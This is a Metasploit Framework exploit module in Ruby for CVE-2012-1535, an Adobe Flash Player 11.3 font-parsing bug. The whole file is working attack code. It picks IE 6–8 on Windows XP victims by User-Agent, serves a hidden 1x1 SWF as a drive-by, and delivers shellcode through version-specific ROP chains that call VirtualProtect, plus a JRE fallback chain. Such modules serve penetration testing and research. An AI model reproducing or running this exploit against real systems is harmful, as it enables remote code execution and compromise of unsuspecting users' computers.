##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Adobe Flash Player 11.3 Font Parsing Code Execution",
			'Description'    => %q{
					This module exploits a vulnerability found in the ActiveX component of Adobe
				Flash Player before 11.3.300.271. By supplying a corrupt Font file used by the SWF,
				it is possible to gain arbitrary remote code execution under the context of the
				user, as exploited in the wild.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Alexander Gavrun', #Through iDefense
					'sinn3r',
					'juan vazquez'
				],
			'References'     =>
				[
					[ 'CVE', '2012-1535' ],
					[ 'OSVDB', '84607'],
					[ 'BID', '55009'],
					[ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/cve-2012-1535-adobe-flash-being-exploited-in-the-wild/' ],
					[ 'URL', 'http://vrt-blog.snort.org/2012/08/cve-2012-1535-flash-0-day-in-wild.html' ],
					[ 'URL', 'http://contagiodump.blogspot.com.es/2012/08/cve-2012-1535-samples-and-info.html' ]
				],
			'Payload'        =>
				{
					'Space'    => 1024
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested successfully on:
					# Flash 11.3.300.268
					# Flash 11.3.300.265
					# Flash 11.3.300.257
					[ 'Automatic', {} ],
					[
						'IE 6 on Windows XP SP3',
						{
							'Rop'    => nil
						}
					],
					[
						'IE 7 on Windows XP SP3',
						{
							'Rop'    => nil
						}
					],
					[
						'IE 8 on Windows XP SP3',
						{
							'Rop' => true
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 9 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptEnum.new('ROP', [true, "The ROP chain to use", 'SWF', %w(SWF JRE)]),
			], self.class)
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	def get_payload(t, flash_version=nil)
		if t['Rop'].nil?
			p = [
				0x0c0c0c0c, # mapped at 1e0d0000
				0x0c0c0c0c,
				0x0c0c0c0c, # mapped at 1e0d0008
			].pack("V*")

			p << payload.encoded
		else
			if datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,257/

				print_status("Using Rop Chain For Flash: #{flash_version}")
				stack_pivot = [
					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
					0x0c0c0c0c,
					0x1001d891, # xchg eax, esp # ret (1e0d0008)
				].pack("V*")

				rop = [
					0x10241001, # POP EAX # RETN (Flash32_11_3_300_257.ocx)
					0x106e3384, # <- *&VirtualProtect()
					0x1029de2f, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_257.ocx)
					0x106add37, # XCHG EAX,ESI # RETN (Flash32_11_3_300_257.ocx)
					0x1064e000, # POP EBP # RETN (Flash32_11_3_300_257.ocx)
					0x10175c57, # ptr to 'jmp esp' (from Flash32_11_3_300_257.ocx)
					0x106a4010, # POP EBX # RETN (Flash32_11_3_300_257.ocx)
					0x00000201, # <- change size to mark as executable if needed (-> ebx)
					0x104de800, # POP ECX # RETN (Flash32_11_3_300_257.ocx)
					0x10955000, # W pointer (lpOldProtect) (-> ecx)
					0x10649003, # POP EDI # RETN (Flash32_11_3_300_257.ocx)
					0x10649004, # ROP NOP (-> edi)
					0x10649987, # POP EDX # RETN (Flash32_11_3_300_257.ocx)
					0x00000040, # newProtect (0x40) (-> edx)
					0x10241001, # POP EAX # RETN (Flash32_11_3_300_257.ocx)
					nop,        # NOPS (-> eax)
					0x1060e809, # PUSHAD # RETN (Flash32_11_3_300_257.ocx)
				].pack("V*")

			elsif datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,265/

				print_status("Using Rop Chain For Flash: #{flash_version}")
				stack_pivot = [
					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
					0x0c0c0c0c,
					0x1001d6d3, # xchg eax, esp # ret (1e0d0008)
				].pack("V*")

				rop = [
					0x10241002, # POP EAX # RETN (Flash32_11_3_300_265.ocx)
					0x106e338c, # <- *&VirtualProtect()
					0x1029ea04, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_265.ocx)
					0x103d60b8, # XCHG EAX,ESI # RETN (Flash32_11_3_300_265.ocx)
					0x105cc000, # POP EBP # RETN (Flash32_11_3_300_265.ocx)
					0x1001c5cd, # ptr to 'jmp esp' (from Flash32_11_3_300_265.ocx)
					0x10398009, # POP EBX # RETN (Flash32_11_3_300_265.ocx)
					0x00000201, # <- change size to mark as executable if needed (-> ebx)
					0x10434188, # POP ECX # RETN (Flash32_11_3_300_265.ocx)
					0x10955000, # W pointer (lpOldProtect) (-> ecx)
					0x105c1811, # POP EDI # RETN (Flash32_11_3_300_265.ocx)
					0x105c1812, # ROP NOP (-> edi)
					0x10650602, # POP EDX # RETN (Flash32_11_3_300_265.ocx)
					0x00000040, # newProtect (0x40) (-> edx)
					0x10241002, # POP EAX # RETN (Flash32_11_3_300_265.ocx)
					nop,        # NOPS (-> eax)
					0x1062800f, # PUSHAD # RETN (Flash32_11_3_300_265.ocx)
				].pack("V*")

			elsif datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,268/

				print_status("Using Rop Chain For Flash: #{flash_version}")
				stack_pivot = [
					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
					0x0c0c0c0c,
					0x1001d755, # xchg eax, esp # ret (1e0d0008)
				].pack("V*")
				rop = [
					0x1023e9b9, # POP EAX # RETN (Flash32_11_3_300_268.ocx)
					0x106e438c, # <- *&VirtualProtect()
					0x10198e00, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_268.ocx)
					0x106ddf15, # XCHG EAX,ESI # RETN (Flash32_11_3_300_268.ocx)
					0x1035f000, # POP EBP # RETN (Flash32_11_3_300_268.ocx)
					0x10175c28, # ptr to 'jmp esp' (from Flash32_11_3_300_268.ocx)
					0x105e0013, # POP EBX # RETN (Flash32_11_3_300_268.ocx)
					0x00000201, # <- change size to mark as executable if needed (-> ebx)
					0x10593801, # POP ECX # RETN (Flash32_11_3_300_268.ocx)
					0x1083c000, # RW pointer (lpOldProtect) (-> ecx)
					0x10308b0e, # POP EDI # RETN (Flash32_11_3_300_268.ocx)
					0x10308b0f, # ROP NOP (-> edi)
					0x10663a00, # POP EDX # RETN (Flash32_11_3_300_268.ocx)
					0x00000040, # newProtect (0x40) (-> edx)
					0x1023e9b9, # POP EAX # RETN (Flash32_11_3_300_268.ocx)
					nop,        # NOPS (-> eax)
					0x1069120b, # PUSHAD # RETN (Flash32_11_3_300_268.ocx)
				].pack("V*")

			else

				print_status("Default back to JRE ROP")
				stack_pivot = [
					0x7c34a028, # POP EDI # POP ESI # RETN (1e0d0000)
					0x0c0c0c0c,
					0x7c348b05, # xchg eax, esp # ret (1e0d0008)
				].pack("V*")

				rop = [
					0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
					0x00001000, # (dwSize)
					0x7c347f98, # RETN (ROP NOP)
					0x7c3415a2, # JMP [EAX]
					0xffffffff,
					0x7c376402, # skip 4 bytes
					0x7c345255, # INC EBX # FPATAN # RETN
					0x7c352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
					0x7c344f87, # POP EDX # RETN
					0x00000040, # flNewProtect
					0x7c34d201, # POP ECX # RETN
					0x7c38b001, # &Writable location
					0x7c347f97, # POP EAX # RETN
					0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
					0x7c378c81, # PUSHAD # ADD AL,0EF # RETN
					0x7c345c30, # ptr to 'push esp #  ret '
				].pack("V*")

			end
			p = stack_pivot
			p << rop
			p << payload.encoded
		end
		return p
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1]  #IE 6 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[2]  #IE 7 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
			return targets[3]  #IE 8 on Windows XP SP3
		else
			return nil
		end
	end

	def on_request_uri(cli, request)

		agent = request.headers['User-Agent']
		print_status("User-agent: #{agent}")
		my_target = get_target(agent)

		print_status("Client requesting: #{request.uri}")

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("Browser not supported: #{agent}")
			send_not_found(cli)
			return
		end

		# The SWF request itself
		if request.uri =~ /\.swf$/
			print_status("Sending SWF")
			send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash'})
			return
		end

		# The TXT payload request
		if request.uri =~ /\.txt$/
			flash_version = request.headers['x-flash-version']
			shellcode = get_payload(my_target, flash_version).unpack('H*')[0]
			print_status("Sending Payload")
			send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })
			return
		end

		swf_uri = get_resource() + Rex::Text.rand_text_alphanumeric(rand(8)+4) + ".swf"

		html = %Q|
		<html>
		<head>
		</head>
		<body>
		<object width="1" height="1" type="application/x-shockwave-flash" data="#{swf_uri}">
		<param name="movie" value="#{swf_uri}">
		</object>
		</body>
		</html>
		|

		html = html.gsub(/^\t\t/, '')

		# we need to handle direct /pay.txt requests
		proc = Proc.new do |cli, req|
			on_request_uri(cli, req)
		end
		add_resource({'Path' => "/pay.txt", 'Proc' => proc}) rescue nil

		print_status("Sending HTML")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

	def exploit
		@swf = create_swf
		print_status("SWF Loaded: #{@swf.length.to_s} bytes")
		super
	end

	def create_swf
		path = ::File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-1535", "trigger.swf" )
		fd = ::File.open( path, "rb" )
		swf = fd.read(fd.stat.size)
		fd.close
		return swf
	end

	def cleanup
		vprint_status("Removing txt resource")
		remove_resource('/pay.txt') rescue nil
		super
	end

end
